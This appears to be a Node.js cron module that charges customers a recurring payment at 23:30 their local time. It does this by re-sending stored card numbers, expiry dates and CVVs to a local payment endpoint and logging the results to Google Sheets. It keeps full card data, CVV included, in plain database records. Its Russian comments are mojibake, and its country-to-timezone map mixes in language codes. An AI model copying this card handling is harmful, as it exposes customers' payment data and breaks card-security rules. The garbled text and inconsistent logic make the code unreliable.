const cron = require('node-cron');
const { PrismaClient } = require('@prisma/client');
const moment = require('moment-timezone');
const axios = require('axios');

const prisma = new PrismaClient();

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —á–∞—Å–æ–≤–æ–≥–æ –ø–æ—è—Å–∞ –ø–æ –∫–æ–¥—É —Å—Ç—Ä–∞–Ω—ã
function getTimezoneByCountry(countryCode) {
  const timezoneMap = {
    'US': 'America/New_York',
    'RU': 'Europe/Moscow',
    'UA': 'Europe/Kiev',
    'TR': 'Europe/Istanbul',
    'GB': 'Europe/London',
    'DE': 'Europe/Berlin',
    'FR': 'Europe/Paris',
    'IT': 'Europe/Rome',
    'ES': 'Europe/Madrid',
    'PL': 'Europe/Warsaw',
    'RO': 'Europe/Bucharest',
    'NL': 'Europe/Amsterdam',
    'PT': 'Europe/Lisbon',
    'SA': 'Asia/Riyadh',
    'ID': 'Asia/Jakarta',
    'TH': 'Asia/Bangkok',
    'VI': 'Asia/Ho_Chi_Minh',
    'JA': 'Asia/Tokyo',
    'KO': 'Asia/Seoul',
    'ZH': 'Asia/Shanghai',
    'HE': 'Asia/Jerusalem',
    'HI': 'Asia/Kolkata',
    'MX': 'America/Mexico_City'
  };
  
  return timezoneMap[countryCode] || 'UTC';
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–π –ø–æ–¥–ø–∏—Å–∫–∏ (–ø–æ–≤—Ç–æ—Ä–Ω—ã–π –ø–ª–∞—Ç–µ–∂)
async function createRecurringPayment(payment) {
  try {
    console.log(`üîÑ –°–æ–∑–¥–∞–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—ã–π –ø–ª–∞—Ç–µ–∂ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ${payment.firstName} ${payment.lastName}`);
    
    // –î–∞–Ω–Ω—ã–µ –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –ø–ª–∞—Ç–µ–∂–∞
    const recurringPaymentData = {
      firstName: payment.firstName,
      lastName: payment.lastName,
      email: payment.email,
      phone: payment.phone,
      countryCode: payment.countryCode,
      address: payment.address,
      postalCode: payment.postalCode,
      city: payment.city,
      cardHolder: payment.cardHolder,
      cardNumber: payment.cardNumber,
      expiry: payment.expiry,
      cvv: payment.cvv,
      plan: payment.plan,
      bid: payment.bid,
      userHash: payment.userHash,
      locale: payment.locale,
      subid: payment.subid,
      price: payment.price,
      isRecurring: true
    };
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–¥–ø–∏—Å–∫–∏
            const response = await axios.post('http://localhost:3011/pay', recurringPaymentData, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    
    if (response.data.success) {
      console.log(`‚úÖ –ü–æ–≤—Ç–æ—Ä–Ω—ã–π –ø–ª–∞—Ç–µ–∂ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω –¥–ª—è ${payment.firstName} ${payment.lastName}`);
      
      // –û–±–Ω–æ–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å –≤ –ë–î
      await prisma.payment.update({
        where: { id: payment.id },
        data: {
          isSecondPayment: true,
          subscriptionReferenceCode: response.data.firstReferenceCode,
          nextRecurringDate: moment().add(7, 'days').toDate()
        }
      });
      
      // –õ–æ–≥–∏—Ä—É–µ–º –≤ Google Sheets
      const { addNewSubscriptionToSheet } = require('./lib/googleSheets');
      await addNewSubscriptionToSheet({
        bid: payment.bid || 'murkafix',
        firstName: payment.firstName,
        lastName: payment.lastName,
        plan: payment.plan,
        subscriptionId: response.data.firstReferenceCode,
        paymentType: 'recurring_payment',
        countryCode: payment.countryCode
      });
      
    } else {
      console.error(`‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –ø–ª–∞—Ç–µ–∂–∞: ${response.data.error}`);
      
      // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø –æ—à–∏–±–∫–∏ –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ª–µ–¥—É—é—â—É—é –ø–æ–ø—ã—Ç–∫—É
      let nextAttemptDate;
      let errorType = 'unknown';
      
      if (response.data.error && response.data.error.includes('insufficient funds')) {
        // –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ - –ø—Ä–æ–±—É–µ–º —á–µ—Ä–µ–∑ —Å—É—Ç–∫–∏
        nextAttemptDate = moment().add(1, 'day').toDate();
        errorType = 'insufficient_funds';
      } else if (response.data.error && response.data.error.includes('card declined')) {
        // –ö–∞—Ä—Ç–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞ - –ø—Ä–µ–∫—Ä–∞—â–∞–µ–º –ø–æ–ø—ã—Ç–∫–∏
        nextAttemptDate = null;
        errorType = 'card_declined';
      } else {
        // –î—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏ - –ø—Ä–µ–∫—Ä–∞—â–∞–µ–º –ø–æ–ø—ã—Ç–∫–∏
        nextAttemptDate = null;
        errorType = 'other_error';
      }
      
      // –û–±–Ω–æ–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å –≤ –ë–î —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± –æ—à–∏–±–∫–µ
      await prisma.payment.update({
        where: { id: payment.id },
        data: {
          nextRecurringDate: nextAttemptDate,
          lastError: response.data.error,
          errorType: errorType
        }
      });
      
      // –õ–æ–≥–∏—Ä—É–µ–º –æ—à–∏–±–∫—É –≤ Google Sheets
      const { addNewSubscriptionToSheet } = require('./lib/googleSheets');
      await addNewSubscriptionToSheet({
        bid: payment.bid || 'murkafix',
        firstName: payment.firstName,
        lastName: payment.lastName,
        plan: payment.plan,
        subscriptionId: `failed_${Date.now()}`,
        paymentType: 'recurring_payment', // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç–æ—Ç –∂–µ —Ç–∏–ø –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤ —Ç—É –∂–µ —Å—Ç—Ä–æ–∫—É
        countryCode: payment.countryCode,
        error: response.data.error
      });
    }
    
  } catch (error) {
    console.error(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –ø–ª–∞—Ç–µ–∂–∞:`, error.message);
  }
}

// –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–æ–≤—Ç–æ—Ä–Ω—ã—Ö –ø–ª–∞—Ç–µ–∂–µ–π
async function processRecurringPayments() {
  try {
    console.log('üïê –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–ª–∞—Ç–µ–∂–∏ –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ —Å–Ω—è—Ç–∏—è...');
    
    // –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –ø–ª–∞—Ç–µ–∂–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—ã–ª–∏ —Å–æ–∑–¥–∞–Ω—ã 7 –¥–Ω–µ–π –Ω–∞–∑–∞–¥
    const sevenDaysAgo = new Date();
    sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
    
    const payments = await prisma.payment.findMany({
      where: {
        createdAt: {
          gte: sevenDaysAgo
        },
        isSecondPayment: false, // –¢–æ–ª—å–∫–æ —Ç–µ, –∫–æ—Ç–æ—Ä—ã–µ –µ—â–µ –Ω–µ –±—ã–ª–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ –æ–ø–ª–∞—á–µ–Ω—ã
        plan: {
          not: 'test' // –ò—Å–∫–ª—é—á–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–µ –ø–ª–∞—Ç–µ–∂–∏
        }
      },
      orderBy: {
        createdAt: 'asc'
      }
    });
    
    console.log(`üìä –ù–∞–π–¥–µ–Ω–æ ${payments.length} –ø–ª–∞—Ç–µ–∂–µ–π –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏`);
    
    for (const payment of payments) {
      try {
        // –ü–æ–ª—É—á–∞–µ–º —á–∞—Å–æ–≤–æ–π –ø–æ—è—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        const userTimezone = getTimezoneByCountry(payment.countryCode);
        const userTime = moment().tz(userTimezone);
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å–µ–π—á–∞—Å 23:30 –ø–æ –≤—Ä–µ–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        if (userTime.hour() === 23 && userTime.minute() >= 30) {
          console.log(`‚è∞ –í—Ä–µ–º—è –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –ø–ª–∞—Ç–µ–∂–∞: ${userTime.format('YYYY-MM-DD HH:mm:ss')} (${userTimezone})`);
          await createRecurringPayment(payment);
        } else {
          console.log(`‚è≥ –ù–µ –≤—Ä–µ–º—è –¥–ª—è –ø–ª–∞—Ç–µ–∂–∞: ${userTime.format('HH:mm')} (${userTimezone})`);
        }
        
      } catch (error) {
        console.error(`‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–ª–∞—Ç–µ–∂–∞ ${payment.id}:`, error.message);
      }
    }
    
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –≤ processRecurringPayments:', error.message);
  }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º cron job –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–ª–∞—Ç–µ–∂–µ–π
function startPaymentScheduler() {
  console.log('üöÄ –ó–∞–ø—É—Å–∫–∞–µ–º –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫ –ø–æ–≤—Ç–æ—Ä–Ω—ã—Ö –ø–ª–∞—Ç–µ–∂–µ–π...');
  
  // –ó–∞–ø—É—Å–∫–∞–µ–º –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É
  cron.schedule('* * * * *', async () => {
    await processRecurringPayments();
  });
  
  console.log('‚úÖ –ü–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫ –∑–∞–ø—É—â–µ–Ω. –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É.');
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä—É—á–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
async function testRecurringPayment() {
  console.log('üß™ –¢–µ—Å—Ç–∏—Ä—É–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—ã–π –ø–ª–∞—Ç–µ–∂...');
  
  // –°–æ–∑–¥–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–π –ø–ª–∞—Ç–µ–∂ –≤ –ë–î
  const testPayment = await prisma.payment.create({
    data: {
      plan: 'solo',
      firstName: 'Test',
      lastName: 'Recurring',
      email: 'test@example.com',
      phone: '+12345678901',
      countryCode: 'US',
      address: '123 Test St',
      postalCode: '12345',
      city: 'Test City',
      cardHolder: 'Test User',
      cardNumber: '4111111111111111',
      expiry: '12/25',
      cvv: '123',
      bid: 'test_bid',
      userHash: 'test_recurring_hash',
      locale: 'en',
      isSecondPayment: false
    }
  });
  
  console.log('‚úÖ –¢–µ—Å—Ç–æ–≤—ã–π –ø–ª–∞—Ç–µ–∂ —Å–æ–∑–¥–∞–Ω:', testPayment.id);
  
  // –ò–º–∏—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è 7 –¥–Ω–µ–π –Ω–∞–∑–∞–¥
  await prisma.payment.update({
    where: { id: testPayment.id },
    data: {
      createdAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000)
    }
  });
  
  console.log('‚úÖ –í—Ä–µ–º—è –ø–ª–∞—Ç–µ–∂–∞ –∏–∑–º–µ–Ω–µ–Ω–æ –Ω–∞ 7 –¥–Ω–µ–π –Ω–∞–∑–∞–¥');
  console.log('üîÑ –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É –ø–æ–≤—Ç–æ—Ä–Ω—ã—Ö –ø–ª–∞—Ç–µ–∂–µ–π...');
  
  await processRecurringPayments();
}

// –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º —Ñ—É–Ω–∫—Ü–∏–∏
module.exports = {
  startPaymentScheduler,
  processRecurringPayments,
  testRecurringPayment
};

// –ï—Å–ª–∏ —Ñ–∞–π–ª –∑–∞–ø—É—â–µ–Ω –Ω–∞–ø—Ä—è–º—É—é
if (require.main === module) {
  // –ó–∞–ø—É—Å–∫–∞–µ–º –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫
  startPaymentScheduler();
}
